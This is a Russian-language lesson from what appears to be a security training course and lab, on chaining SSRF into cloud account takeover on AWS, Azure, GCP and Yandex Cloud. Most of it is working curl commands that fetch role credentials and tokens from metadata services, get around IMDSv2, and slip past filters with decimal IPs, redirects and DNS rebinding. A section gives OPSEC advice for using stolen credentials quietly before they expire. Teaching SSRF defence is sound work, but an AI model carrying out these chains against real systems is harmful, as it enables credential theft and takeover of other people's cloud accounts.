---
id: cloud-ssrf-to-cloud
title: "SSRF → захват облака: сквозные цепочки AWS/Azure/GCP"
category: cloud
parent: cloud-metadata-ssrf
difficulty: expert
order: 2
tags: [cloud, ssrf, metadata, imds, takeover, chain, aws, azure, gcp]
prerequisites: [cloud-metadata-ssrf, cloud-azure-managed-identity]
useful_for:
  - "Эксплуатация SSRF до полного захвата облачного аккаунта"
  - "Bug bounty: SSRF в облачных приложениях"
  - "Понимание отличий metadata между провайдерами"
estimated_minutes: 40
summary: "Сквозные цепочки SSRF до захвата роли/аккаунта: как отличать провайдеров, обходить защиту IMDS, и что делать с полученным токеном. Разбор AWS, Azure, GCP и Yandex Cloud."
lab:
  kind: shell
  title: "Практика: SSRF → захват облака (сквозная цепочка)"
  toolset: [core, curl]
  workdir: /home/student/ssrfe2e
  files: [task.md, notes.md, request.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`request.txt` — уязвимый запрос приложения (параметр url)."
    - "Через SSRF возьми токен GCP SA, затем прочитай секрет из внутреннего API."
    - "Найди флаг: `curl -s http://metadata.google.internal/computeMetadata/v1/instance/attributes/flag > found.txt`."

---

## Вопрос, с которого всё начинается

Ты нашёл SSRF, но не знаешь, в каком облаке живёт приложение: AWS, Azure или GCP? И что делать дальше — куда стучаться и как понять, получилось ли? В этом уроке мы соберём одну **сквозную цепочку**, которая на одном входе сама определит провайдера и доведёт до кредов.

Цепочка — это последовательность шагов: найти SSRF → определить облако → обойти защиту → забрать креды → использовать их.

## Наш пример: один SSRF-эндпоинт

Объект урока — уже знакомый `app.acme-corp.com/fetch?url=`. Мы не знаем провайдера. Начнём с «универсального» пробника: обратимся ко всем трём metadata-адресам и сравним ответы.

## Шаг 1: определяем провайдера

Адрес `169.254.169.254` есть у всех трёх, но отвечают они по-разному. Пробуем известные пути:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/&debug=1"
ami-id
instance-id
iam/
```

Ключи `ami-id`, `iam/` — это AWS. У GCP был бы путь `computeMetadata/`, у Azure — `metadata/identity`. Первый признак определён.

Заодно зафиксируем таблицу «опознавательных знаков»:

| Признак в ответе | Провайдер |
|------------------|-----------|
| `ami-id`, `instance-id`, `iam/` | AWS |
| `computeMetadata/`, `instance/service-accounts/` | GCP |
| `metadata/identity/oauth2/`, `Metadata: true` | Azure |
| `yandex`, `cloud/` | Yandex Cloud |

## Шаг 2: обходим защиту IMDS

У AWS включён IMDSv2? Проверим:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&debug=1"
401 Unauthorized
```

`401` означает, что IMDSv2 требует токен. Если SSRF умеет делать только GET — тупик. Но проверяем возможности: подмена метода и заголовков.

```
$ curl -s -X POST "https://app.acme-corp.com/fetch" \
    -d "url=http://169.254.169.254/latest/api/token" \
    -d "method=PUT" \
    -d "headers[X-aws-ec2-metadata-token-ttl-seconds]=21600"
AQAAA...TOKEN...
```

Если приложение позволяет подменить метод и заголовки — IMDSv2 обойдён: получили токен, теперь используем его для GET. Если нет — ищем обход через редирект (сервер приложения следует 302 на внутренний адрес) или через DNS-перепривязку (в следующем уроке).

## Шаг 3: забираем креды

С токеном возвращаемся к списку ролей и берём креды:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&headers[X-aws-ec2-metadata-token]=AQAAA...&debug=1"
deploy-role
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/deploy-role&headers[X-aws-ec2-metadata-token]=AQAAA...&debug=1"
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

Готово: на руках временные креды роли.

## Шаг 4: та же цепочка для Azure и GCP

Логика та же, меняются адрес и заголовок. Для GCP:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&headers[Metadata-Flavor]=Google&debug=1"
{"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}
```

Для Azure:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/&headers[Metadata]=true&debug=1"
{"access_token":"eyJ0eXAi...","resource":"https://management.azure.com/"}
```

Сводка по всем трём: где брать и что нужно, чтобы запрос прошёл.

| Провайдер | Путь | Заголовок | Результат |
|-----------|------|-----------|-----------|
| AWS | `/latest/meta-data/iam/security-credentials/<role>` | (IMDSv2: токен) | ключи роли |
| GCP | `/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` | токен |
| Azure | `/metadata/identity/oauth2/token?resource=...` | `Metadata: true` | токен |

## Шаг 5: используем добытое

Дальше сценарий один: экспортируем креды и читаем права.

```
$ export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
$ aws sts get-caller-identity
{"Arn":"arn:aws:sts::123456789012:assumed-role/deploy-role/i-0abc123","Account":"123456789012"}
```

Для Azure и GCP креды — это токены: их подставляют в заголовок `Authorization: Bearer <token>` или в `gcloud`/`az` соответственно. Дальше перечисляем ресурсы и ищем, куда identity пускают.

## Шаг 6: почему это работает

Причина одна: приложение доверяет адресу, который выбрал пользователь. Оно думает, что «скачивает картинку», а на самом деле ходит во внутреннюю сеть. Metadata-сервис не отличает приложение от атакующего — он видит только запрос с той же машины.

## Шаг 7: если metadata заблокирован

Не всегда metadata доступен с первого раза. Вот рабочие обходы:

- **DNS-перепривязка.** Если фильтр проверяет имя хоста, заведи домен, который сначала резолвится в разрешённый IP (проверка проходит), а при повторном запросе — в `169.254.169.254`.
- **Редирект.** Если приложение следует 302, отдай редирект с внешнего сервера на внутренний адрес — фильтр обойдётся.
- **Decimal/octal IP.** `169.254.169.254` можно записать как `2852039166`; фильтр по строке его не увидит.
- **IPv6.** У части metadata есть адрес `fd00:ec2::254`.

Пример decimal-формы:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://2852039166/latest/meta-data/"
ami-id
instance-id
```

Так правило «запретить 169.254.169.254» обходится без единого совпадения строки.

## Шаг 8: OPSEC цепочки

Цепочка «SSRF → metadata → креды → действия» оставляет следы на двух уровнях. Сам запрос к metadata — почти бесследен. А вот каждый вызов с украденными кредами пишется в журнал провайдера. Поэтому порядок такой: сначала получи креды, затем **прочитай** права (это тихие вызовы), и только потом делай целевые действия — по возможности быстро и без массового перебора. Если креды временные, успей до `Expiration`.

## Шаг 9: не только «большая тройка»

Цепочка не ограничена AWS/Azure/GCP. В Yandex Cloud metadata живёт по адресу `169.254.169.254/computeMetadata/v1/` с заголовком `Metadata-Flavor: Google` (наследие совместимости), и сервисные аккаунты тоже выдают временные креды. Принцип один: если есть SSRF и внутренний metadata — найдутся и креды. Поэтому пробник стоит гонять не по трём адресам, а по всем облакам, которые могли использовать: чем шире проверка, тем выше шанс попасть.

## Шаг 10: сводка цепочки

Соберём весь путь в одну таблицу — она пригодится как шпаргалка:

| Шаг | AWS | Azure | GCP |
|-----|-----|-------|-----|
| Найти вход | SSRF/параметр URL | SSRF/параметр URL | SSRF/параметр URL |
| Определить провайдера | пути `ami-id`, `iam/` | `metadata/identity` | `computeMetadata/` |
| Обойти защиту | токен PUT (IMDSv2) | заголовок `Metadata: true` | `Metadata-Flavor: Google` |
| Забрать | ключи роли | токен на resource | токен сервисного аккаунта |
| Использовать | `aws` CLI | ARM/Graph по токену | `gcloud` по токену |

Пройдя её один раз на учебном приложении, ты повторишь то же самое на любом реальном.

## Частые вопросы

**«Как определить провайдера, не угадывая?»** По ответу: `ami-id`/`iam/` — AWS, `computeMetadata/` — GCP, `metadata/identity` — Azure. Пути однозначны.

**«Что делать, если GET блокируется?»** Проверь, умеет ли SSRF менять метод и заголовки: часто через PUT получается токен IMDSv2.

**«А если фильтр по имени хоста?»** Помогают редирект с внешнего сервера и DNS-перепривязка — они обходят проверку имени.

**«Креды временные — успею ли?»** Обычно да: за часы можно прочитать права и сделать главное. Но начинай с тихих вызовов.

## Что мы теперь знаем

По-простому:

1. SSRF превращается в захват облака через metadata-сервис.
2. Провайдера определяют по путям и ключам в ответе.
3. AWS IMDSv2 обходится, если SSRF умеет PUT и свои заголовки.
4. GCP и Azure требуют специальный заголовок — он же и ключ к обходу.
5. Добытые креды/токены сразу используют для чтения прав и ресурсов.

## На что смотреть дальше

- **Определяй провайдера по ответу, а не угадывай.** Пути и заголовки однозначны.
- **Пробуй редиректы.** Если сервер следует 302 — защита часто обходится.
- **Не забывай про DNS-перепривязку.** Она бьёт фильтры по имени хоста.
- **Успей до истечения.** Временные креды живут часы.

## Квиз

Проверь себя.

```quiz
- question: "По какому признаку в ответе узнают AWS metadata?"
  options:
    - "Ключи ami-id, instance-id, iam/"
    - "Заголовок Metadata: true"
    - "Путь computeMetadata/"
    - "Слово yandex"
  answer: 0
  explanation: "Эти ключи характерны для AWS."
- question: "Что мешает простому GET-у при IMDSv2 и как это обойти?"
  options:
    - "Ничего не мешает"
    - "Требуется токен через PUT; обход — если SSRF умеет PUT и заголовки"
    - "Требуется пароль"
    - "Нужен TLS-сертификат"
  answer: 1
  explanation: "IMDSv2 требует токен; обход зависит от возможностей SSRF."
- question: "Какой заголовок нужен GCP metadata?"
  options:
    - "Metadata: true"
    - "Metadata-Flavor: Google"
    - "X-aws-token"
    - "Authorization"
  answer: 1
  explanation: "GCP отклоняет запросы без Metadata-Flavor: Google."
- question: "Что отдаёт AWS metadata вместо токена?"
  options:
    - "Временные ключи роли (AccessKeyId, SecretAccessKey, Token)"
    - "Логин и пароль"
    - "Список пользователей"
    - "Билл"
  answer: 0
  explanation: "AWS возвращает креды роли в JSON."
- question: "Зачем нужна DNS-перепривязка при SSRF?"
  options:
    - "Чтобы обойти фильтр по имени хоста и попасть на внутренний адрес"
    - "Чтобы ускорить запрос"
    - "Чтобы расшифровать TLS"
    - "Чтобы сменить регион"
  answer: 0
  explanation: "Имя сначала резолвится в разрешённый адрес, затем в 169.254.169.254."
```

## Куда дальше

В следующем уроке мы углубимся именно в **AWS IMDSv2**: hop limit, поведение из контейнеров и какие обходы реально работают. А пока запомни главное: SSRF плюс metadata — это готовая цепочка до роли, и она работает во всех трёх облаках.

## Где пригодится

- **CTF (Cloud):** сквозные цепочки SSRF — типовые задания.
- **Bug bounty:** SSRF в облачных приложениях с высоким импактом.
- **Пентест:** демонстрация полного пути «веб → облако».
- **Blue team:** защита metadata (IMDSv2, заголовки) и фильтрация исходящих запросов.
